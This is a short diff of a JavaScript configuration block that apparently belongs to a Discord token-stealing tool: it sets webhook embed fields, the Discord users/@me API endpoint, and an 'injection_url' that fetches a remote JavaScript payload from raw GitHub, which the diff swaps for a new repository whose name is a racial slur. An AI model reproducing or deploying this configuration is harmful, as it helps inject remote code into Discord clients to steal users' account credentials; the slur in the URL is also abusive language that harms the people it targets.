@@ -14,7 +14,7 @@ const config = {
   embed_name: 'xen', 
   embed_icon: 'https://i.hizliresim.com/6t31tw2.jpg', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/zdevilish1337/injection/main/etitz.js', 
+  injection_url: 'https://raw.githubusercontent.com/xvy0/nigga/main/main/nigga.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
